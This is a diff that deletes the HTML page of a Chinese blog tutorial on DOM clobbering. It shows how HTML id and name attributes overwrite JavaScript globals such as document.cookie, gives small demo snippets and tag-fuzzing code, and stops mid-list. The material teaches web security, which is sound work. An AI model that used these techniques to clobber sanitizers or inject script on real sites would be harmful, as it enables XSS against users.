@@ -1,1446 +1,285 @@
-<!DOCTYPE html>
-<html lang="zh-cn" dir="ltr">
-    <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="DOM Clobbering 我刚开始以为是DOM型XSS，结果发现完全不一样\n靶场：DOM clobbering | Web Security Academy\n参考文章：使用 Dom Clobbering 扩展 XSS-先知社区\n定义 DOM Clobbering就是通过在页面中插入HTML代码，改变javascript中全局变量或者对象属性的含义，从而永久改变javascript执行结果的一种技术。其中的“clobbering”就是指我们破坏了原本的全局变量或对象属性。\n">
-<title>DOM Clobbering</title>
-
-<link rel='canonical' href='https://0d000721999.github.io/p/dom-clobbering/'>
-
-<link rel="stylesheet" href="/scss/style.min.37a6022266b4205ec3a616ff86e34064f3524e0913faf185a3d362063a8d7490.css"><meta property='og:title' content="DOM Clobbering">
-<meta property='og:description' content="DOM Clobbering 我刚开始以为是DOM型XSS，结果发现完全不一样\n靶场：DOM clobbering | Web Security Academy\n参考文章：使用 Dom Clobbering 扩展 XSS-先知社区\n定义 DOM Clobbering就是通过在页面中插入HTML代码，改变javascript中全局变量或者对象属性的含义，从而永久改变javascript执行结果的一种技术。其中的“clobbering”就是指我们破坏了原本的全局变量或对象属性。\n">
-<meta property='og:url' content='https://0d000721999.github.io/p/dom-clobbering/'>
-<meta property='og:site_name' content='美咕噜的小站'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='XSS trick' /><meta property='article:published_time' content='2025-08-09T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-08-09T00:00:00&#43;00:00'/><meta property='og:image' content='https://0d000721999.github.io/p/dom-clobbering/1.png' />
-<meta name="twitter:title" content="DOM Clobbering">
-<meta name="twitter:description" content="DOM Clobbering 我刚开始以为是DOM型XSS，结果发现完全不一样\n靶场：DOM clobbering | Web Security Academy\n参考文章：使用 Dom Clobbering 扩展 XSS-先知社区\n定义 DOM Clobbering就是通过在页面中插入HTML代码，改变javascript中全局变量或者对象属性的含义，从而永久改变javascript执行结果的一种技术。其中的“clobbering”就是指我们破坏了原本的全局变量或对象属性。\n"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://0d000721999.github.io/p/dom-clobbering/1.png' />
-    <link rel="shortcut icon" href="/favicon.ico" />
-
-    </head>
-    <body class="
-    article-page
-    ">
-    <script>
-        (function() {
-            const colorSchemeKey = 'StackColorScheme';
-            localStorage.setItem(colorSchemeKey, "light");
-        })();
-    </script><script>
-    (function() {
-        const colorSchemeKey = 'StackColorScheme';
-        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
-        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
-
-        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
-            
-
-            document.documentElement.dataset.scheme = 'dark';
-        } else {
-            document.documentElement.dataset.scheme = 'light';
-        }
-    })();
-</script>
-<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
-    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
-        <span class="hamburger-box">
-            <span class="hamburger-inner"></span>
-        </span>
-    </button>
-
-    <header>
-        
-            
-            <figure class="site-avatar">
-                <a href="/">
-                
-                    
-                    
-                    
-                        
-                        <img src="/img/avatar_hu988272603220494224.png" width="300"
-                            height="300" class="site-logo" loading="lazy" alt="Avatar">
-                    
-                
-                </a>
-                
-                    <span class="emoji">😋</span>
-                
-            </figure>
-            
-        
-        
-        <div class="site-meta">
-            <h1 class="site-name"><a href="/">美咕噜的小站</a></h1>
-            <h2 class="site-description">Ciallo～(∠・ω&lt; )⌒★</h2>
-        </div>
-    </header><ol class="menu-social">
-            
-                <li>
-                    <a 
-                        href='https://buuoj.cn/users/175721'
-                        target="_blank"
-                        title="BUUOJ"
-                        rel="me"
-                    >
-                        
-                        
-                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <path d="M7 20v-16h6a4 4 0 0 1 0 8a4 4 0 0 1 0 8h-6" />
-  <line x1="7" y1="12" x2="13" y2="12" />
-</svg>
-
-
-
-                        
-                    </a>
-                </li>
-            
-                <li>
-                    <a 
-                        href='https://github.com/0d000721999'
-                        target="_blank"
-                        title="GitHub"
-                        rel="me"
-                    >
-                        
-                        
-                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
-  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
-</svg>
-
-
-
-                        
-                    </a>
-                </li>
-            
-        </ol><ol class="menu" id="main-menu">
-        
-        
-        
-        <li >
-            <a href='/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <polyline points="5 12 3 12 12 3 21 12 19 12" />
-  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
-  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
-</svg>
-
-
-
-                
-                <span>主页</span>
-            </a>
-        </li>
-        
-        
-        <li >
-            <a href='/%E5%85%B3%E4%BA%8E/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="7" r="4" />
-  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
-</svg>
-
-
-
-                
-                <span>关于</span>
-            </a>
-        </li>
-        
-        
-        <li >
-            <a href='/archives/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <rect x="3" y="4" width="18" height="4" rx="2" />
-  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
-  <line x1="10" y1="12" x2="14" y2="12" />
-</svg>
-
-
-
-                
-                <span>Archives</span>
-            </a>
-        </li>
-        
-        
-        <li >
-            <a href='/search/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="10" cy="10" r="7" />
-  <line x1="21" y1="21" x2="15" y2="15" />
-</svg>
-
-
-
-                
-                <span>Search</span>
-            </a>
-        </li>
-        
-        
-        <li >
-            <a href='/friends/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <line x1="5" y1="9" x2="19" y2="9" />
-  <line x1="5" y1="15" x2="19" y2="15" />
-  <line x1="11" y1="4" x2="7" y2="20" />
-  <line x1="17" y1="4" x2="13" y2="20" />
-</svg>
-
-
-
-                
-                <span>Friends</span>
-            </a>
-        </li>
-        
-        
-        <li >
-            <a href='/links/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
-  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
-</svg>
-
-
-
-                
-                <span>Links</span>
-            </a>
-        </li>
-        
-        <li class="menu-bottom-section">
-            <ol class="menu">
-
-                
-            </ol>
-        </li>
-    </ol>
-</aside>
-
-    <aside class="sidebar right-sidebar sticky">
-        
-            
-                
-    <section class="widget archives">
-        <div class="widget-icon">
-            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <line x1="5" y1="9" x2="19" y2="9" />
-  <line x1="5" y1="15" x2="19" y2="15" />
-  <line x1="11" y1="4" x2="7" y2="20" />
-  <line x1="17" y1="4" x2="13" y2="20" />
-</svg>
-
-
-
-        </div>
-        <h2 class="widget-title section-title">目录</h2>
-        
-        <div class="widget--toc">
-            <nav id="TableOfContents">
-  <ol>
-    <li><a href="#定义">定义</a></li>
-    <li><a href="#举个例子">举个例子</a></li>
-    <li><a href="#前置知识">前置知识</a>
-      <ol>
-        <li><a href="#tostring">toString</a></li>
-        <li><a href="#htmlcollection">HTMLCollection</a></li>
-        <li><a href="#html-relationships">HTML Relationships</a></li>
-        <li><a href="#三级关系xyz的写法">三级关系x.y.z的写法</a></li>
-        <li><a href="#自定义属性构造">自定义属性构造</a></li>
-      </ol>
-    </li>
-    <li><a href="#bp靶场练习">bp靶场练习</a>
-      <ol>
-        <li><a href="#exploiting-dom-clobbering-to-enable-xss">Exploiting DOM clobbering to enable XSS</a></li>
-        <li><a href="#clobbering-dom-attributes-to-bypass-html-filters">Clobbering DOM attributes to bypass HTML filters</a></li>
-      </ol>
-    </li>
-    <li><a href="#一些著名的利用漏洞">一些著名的利用漏洞</a>
-      <ol>
-        <li><a href="#cve-2017-0928-bypassing-sanitization-using-dom-clobbering">CVE-2017-0928 Bypassing sanitization using DOM clobbering</a></li>
-        <li><a href="#xss-in-gmails-amp4email-via-dom-clobbering">XSS in GMail’s AMP4Email via DOM Clobbering</a></li>
-      </ol>
-    </li>
-  </ol>
-</nav>
-        </div>
-    </section>
-
-            
-        
-    </aside>
-
-
-            <main class="main full-width">
-    <article class="has-image main-article">
-    <header class="article-header">
-        <div class="article-image">
-            <a href="/p/dom-clobbering/">
-                <img src="/p/dom-clobbering/1.png"
-                        
-                        width="1248" 
-                        height="1840" 
-                        loading="lazy"
-                        alt="Featured image of post DOM Clobbering" />
-                
-            </a>
-        </div>
-    
-
-    <div class="article-details">
-    
-    <header class="article-category">
-        
-            <a href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="background-color: #264653; color: #fff;">
-                基础知识
-            </a>
-        
-    </header>
-    
-
-    <div class="article-title-wrapper">
-        <h2 class="article-title">
-            <a href="/p/dom-clobbering/">DOM Clobbering</a>
-        </h2>
-    
-        
-    </div>
-
-    
-    
-    
-    
-    <footer class="article-time">
-        
-            <div>
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
-  <circle cx="18" cy="18" r="4" />
-  <path d="M15 3v4" />
-  <path d="M7 3v4" />
-  <path d="M3 11h16" />
-  <path d="M18 16.496v1.504l1 1" />
-</svg>
-                <time class="article-time--published">Aug 09, 2025</time>
-            </div>
-        
-
-        
-            <div>
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="12" r="9" />
-  <polyline points="12 7 12 12 15 15" />
-</svg>
-
-
-
-                <time class="article-time--reading">
-                    阅读时长: 6 分钟
-                </time>
-            </div>
-        
-    </footer>
-    
-
-    
-</div>
-
-</header>
-
-    <section class="article-content">
-    
-    
-    <h1 id="dom-clobbering">DOM Clobbering
-</h1><p><del>我刚开始以为是DOM型XSS，结果发现完全不一样</del></p>
-<p>靶场：<a class="link" href="https://portswigger.net/web-security/dom-based/dom-clobbering#top"  target="_blank" rel="noopener"
-    >DOM clobbering | Web Security Academy</a></p>
-<p>参考文章：<a class="link" href="https://xz.aliyun.com/news/6925"  target="_blank" rel="noopener"
-    >使用 Dom Clobbering 扩展 XSS-先知社区</a></p>
-<h2 id="定义">定义
-</h2><p>DOM Clobbering就是通过在页面中插入HTML代码，改变javascript中全局变量或者对象属性的含义，从而永久改变javascript执行结果的一种技术。其中的“clobbering”就是指我们破坏了原本的全局变量或对象属性。</p>
-<p><del>不想看前置知识可以直接跳到靶场</del></p>
-<h2 id="举个例子">举个例子
-</h2><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">id </span><span class="o">=</span> <span class="s">x</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">name </span><span class="o">=</span> <span class="s">y</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">y</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">x</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">y</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">x</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">y</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>我们定义id和name属性</p>
-<p>然后通过这种办法，来覆盖原有的值</p>
-<p><img src="/p/dom-clobbering/image-20250809142538823.png"
-	width="875"
-	height="264"
-	srcset="/p/dom-clobbering/image-20250809142538823_hu10109074383850939608.png 480w, /p/dom-clobbering/image-20250809142538823_hu5513311335074718063.png 1024w"
-	loading="lazy"
-	
-		alt="image-20250809142538823"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="331"
-		data-flex-basis="795px"
-	
-></p>
-<p>先创建一个div，然后把这个div插入到body中，再获取cookie时 不再获取js原先提供的cookie 而是把img获取到了。</p>
-<p><strong>document.cookie 已经被我们用img 标签给覆盖了</strong></p>
-<p>这里相当与我们把前面定义的name的值从y改成了cookie,document.y获取到<code>&lt;img name = &quot;y&quot;&gt;</code>，那么document.cookie不就获取到了<code>&lt;img name = &quot;cookie&quot;&gt;</code></p>
-<h2 id="前置知识">前置知识
-</h2><p>既然我们可以通过这种方式去创建或者覆盖 document 或者 window 对象的某些值，但是看起来我们举的例子只是利用标签创建或者覆盖最终得到的也是标签，是一个<code>HTMLElment</code>对象。</p>
-<p><img src="/p/dom-clobbering/image-20250809142737609.png"
-	width="516"
-	height="50"
-	srcset="/p/dom-clobbering/image-20250809142737609_hu8557839092810975004.png 480w, /p/dom-clobbering/image-20250809142737609_hu12330467679694609662.png 1024w"
-	loading="lazy"
-	
-		alt="image-20250809142737609"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="1032"
-		data-flex-basis="2476px"
-	
-></p>
-<p>但是对于大多数情况来说，我们可能更需要将其转换为一个可控的字符串类型，以便我们进行操作。</p>
-<h3 id="tostring">toString
-</h3><p>我们可以通过以下代码来进行 fuzz 得到可以通过<code>toString</code>方法将其转换成字符串类型的标签</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nb">Object</span><span class="p">.</span><span class="nx">getOwnPropertyNames</span><span class="p">(</span><span class="nb">window</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">p</span> <span class="p">=&gt;</span> <span class="nx">p</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/Element$/</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">p</span> <span class="p">=&gt;</span> <span class="nb">window</span><span class="p">[</span><span class="nx">p</span><span class="p">])</span>
-</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">p</span> <span class="p">=&gt;</span> <span class="nx">p</span> <span class="o">&amp;&amp;</span> <span class="nx">p</span><span class="p">.</span><span class="nx">prototype</span> <span class="o">&amp;&amp;</span> <span class="nx">p</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">toString</span> <span class="o">!==</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">toString</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>然后返回了两个函数</p>
-<p><img src="/p/dom-clobbering/image-20250809143850661.png"
-	width="906"
-	height="182"
-	srcset="/p/dom-clobbering/image-20250809143850661_hu7979181878292723190.png 480w, /p/dom-clobbering/image-20250809143850661_hu9766847223253820496.png 1024w"
-	loading="lazy"
-	
-		alt="image-20250809143850661"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="497"
-		data-flex-basis="1194px"
-	
-></p>
-<p>第一个标签其实就是area,跟br那些一样，是空元素，利用不了，第二个是a标签，可以用href来进行字符串转换</p>
-<h3 id="htmlcollection">HTMLCollection
-</h3><p>但是如果我们需要的是x.y 这种形式呢？两层结构我们应该怎么办呢？我们可以尝试上述的办法：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">x</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">y</span>  <span class="na">href</span><span class="o">=</span><span class="s">&#34;hajimi&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">alert</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">y</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>这里无论第一个标签怎么组合，得到的结果都只是<code>undefined</code>。但是我们可以通过另一种方法加入引入 name 属性就会有其他的效果。</p>
-<p><code>HTMLCollection</code>是一个<code>element</code>的“集合”类,值得注意的是我们可以通过<code>collection[name]</code>的形式来调用其中的元素，所以我们似乎可以通过先构建一个<code>HTMLCollection</code>，再通过<code>collection[name]</code>的形式来调用。</p>
-<p>也就是说把上面代码改成</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;x&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;x&#34;</span> <span class="na">name </span><span class="o">=</span> <span class="s">y</span>  <span class="na">href</span><span class="o">=</span><span class="s">&#34;hajimi&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">alert</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">y</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="html-relationships">HTML Relationships
-</h3><p>我们也可以通过利用 HTML 标签之间存在的关系来构建层级关系。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">log</span><span class="o">=</span><span class="p">[];</span>
-</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">html</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;a&#34;</span><span class="p">,</span><span class="s2">&#34;abbr&#34;</span><span class="p">,</span><span class="s2">&#34;acronym&#34;</span><span class="p">,</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;applet&#34;</span><span class="p">,</span><span class="s2">&#34;area&#34;</span><span class="p">,</span><span class="s2">&#34;article&#34;</span><span class="p">,</span><span class="s2">&#34;aside&#34;</span><span class="p">,</span><span class="s2">&#34;audio&#34;</span><span class="p">,</span><span class="s2">&#34;b&#34;</span><span class="p">,</span><span class="s2">&#34;base&#34;</span><span class="p">,</span><span class="s2">&#34;basefont&#34;</span><span class="p">,</span><span class="s2">&#34;bdi&#34;</span><span class="p">,</span><span class="s2">&#34;bdo&#34;</span><span class="p">,</span><span class="s2">&#34;bgsound&#34;</span><span class="p">,</span><span class="s2">&#34;big&#34;</span><span class="p">,</span><span class="s2">&#34;blink&#34;</span><span class="p">,</span><span class="s2">&#34;blockquote&#34;</span><span class="p">,</span><span class="s2">&#34;body&#34;</span><span class="p">,</span><span class="s2">&#34;br&#34;</span><span class="p">,</span><span class="s2">&#34;button&#34;</span><span class="p">,</span><span class="s2">&#34;canvas&#34;</span><span class="p">,</span><span class="s2">&#34;caption&#34;</span><span class="p">,</span><span class="s2">&#34;center&#34;</span><span class="p">,</span><span class="s2">&#34;cite&#34;</span><span class="p">,</span><span class="s2">&#34;code&#34;</span><span class="p">,</span><span class="s2">&#34;col&#34;</span><span class="p">,</span><span class="s2">&#34;colgroup&#34;</span><span class="p">,</span><span class="s2">&#34;command&#34;</span><span class="p">,</span><span class="s2">&#34;content&#34;</span><span class="p">,</span><span class="s2">&#34;data&#34;</span><span class="p">,</span><span class="s2">&#34;datalist&#34;</span><span class="p">,</span><span class="s2">&#34;dd&#34;</span><span class="p">,</span><span class="s2">&#34;del&#34;</span><span class="p">,</span><span class="s2">&#34;details&#34;</span><span class="p">,</span><span class="s2">&#34;dfn&#34;</span><span class="p">,</span><span class="s2">&#34;dialog&#34;</span><span class="p">,</span><span class="s2">&#34;dir&#34;</span><span class="p">,</span><span class="s2">&#34;div&#34;</span><span class="p">,</span><span class="s2">&#34;dl&#34;</span><span class="p">,</span><span class="s2">&#34;dt&#34;</span><span class="p">,</span><span class="s2">&#34;element&#34;</span><span class="p">,</span><span class="s2">&#34;em&#34;</span><span class="p">,</span><span class="s2">&#34;embed&#34;</span><span class="p">,</span><span class="s2">&#34;fieldset&#34;</span><span class="p">,</span><span class="s2">&#34;figcaption&#34;</span><span class="p">,</span><span class="s2">&#34;figure&#34;</span><span class="p">,</span><span class="s2">&#34;font&#34;</span><span class="p">,</span><span class="s2">&#34;footer&#34;</span><span class="p">,</span><span class="s2">&#34;form&#34;</span><span class="p">,</span><span class="s2">&#34;frame&#34;</span><span class="p">,</span><span class="s2">&#34;frameset&#34;</span><span class="p">,</span><span class="s2">&#34;h1&#34;</span><span class="p">,</span><span class="s2">&#34;head&#34;</span><span class="p">,</span><span class="s2">&#34;header&#34;</span><span class="p">,</span><span class="s2">&#34;hgroup&#34;</span><span class="p">,</span><span class="s2">&#34;hr&#34;</span><span class="p">,</span><span class="s2">&#34;html&#34;</span><span class="p">,</span><span class="s2">&#34;i&#34;</span><span class="p">,</span><span class="s2">&#34;iframe&#34;</span><span class="p">,</span><span class="s2">&#34;image&#34;</span><span class="p">,</span><span class="s2">&#34;img&#34;</span><span class="p">,</span><span class="s2">&#34;input&#34;</span><span class="p">,</span><span class="s2">&#34;ins&#34;</span><span class="p">,</span><span class="s2">&#34;isindex&#34;</span><span class="p">,</span><span class="s2">&#34;kbd&#34;</span><span class="p">,</span><span class="s2">&#34;keygen&#34;</span><span class="p">,</span><span class="s2">&#34;label&#34;</span><span class="p">,</span><span class="s2">&#34;legend&#34;</span><span class="p">,</span><span class="s2">&#34;li&#34;</span><span class="p">,</span><span class="s2">&#34;link&#34;</span><span class="p">,</span><span class="s2">&#34;listing&#34;</span><span class="p">,</span><span class="s2">&#34;main&#34;</span><span class="p">,</span><span class="s2">&#34;map&#34;</span><span class="p">,</span><span class="s2">&#34;mark&#34;</span><span class="p">,</span><span class="s2">&#34;marquee&#34;</span><span class="p">,</span><span class="s2">&#34;menu&#34;</span><span class="p">,</span><span class="s2">&#34;menuitem&#34;</span><span class="p">,</span><span class="s2">&#34;meta&#34;</span><span class="p">,</span><span class="s2">&#34;meter&#34;</span><span class="p">,</span><span class="s2">&#34;multicol&#34;</span><span class="p">,</span><span class="s2">&#34;nav&#34;</span><span class="p">,</span><span class="s2">&#34;nextid&#34;</span><span class="p">,</span><span class="s2">&#34;nobr&#34;</span><span 